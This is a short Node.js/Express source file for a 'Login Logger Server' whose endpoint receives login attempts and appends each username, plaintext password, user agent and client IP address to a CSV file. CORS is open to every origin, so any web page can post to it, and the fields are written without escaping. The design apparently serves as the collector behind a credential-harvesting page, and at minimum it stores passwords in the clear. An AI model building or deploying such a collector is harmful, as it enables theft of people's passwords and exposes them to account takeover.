import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import moment from 'moment';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

// Ensure logs directory exists
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// CSV file path
const csvFilePath = path.join(logsDir, 'login_attempts.csv');

// Initialize CSV with headers if it doesn't exist
if (!fs.existsSync(csvFilePath)) {
  const headers = 'Timestamp,Username,Password,Attempt Number,Status,User Agent,IP Address\n';
  fs.writeFileSync(csvFilePath, headers);
}

// Logging endpoint
app.post('/api/logs/login', (req, res) => {
  try {
    const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
    
    // Get client IP
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    // Format the CSV row
    const csvRow = [
      timestamp,
      `"${username}"`,
      `"${password}"`,
      attemptNumber,
      status,
      `"${userAgent}"`,
      ipAddress,
    ].join(',') + '\n';
    
    // Append to CSV file
    fs.appendFileSync(csvFilePath, csvRow);
    
    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
    
    res.json({ success: true, message: 'Login attempt logged' });
  } catch (error) {
    console.error('Error logging login attempt:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'Logger server is running', port: PORT });
});

app.listen(PORT, () => {
  console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
  console.log(`📊 Logs will be saved to: ${csvFilePath}\n`);
});
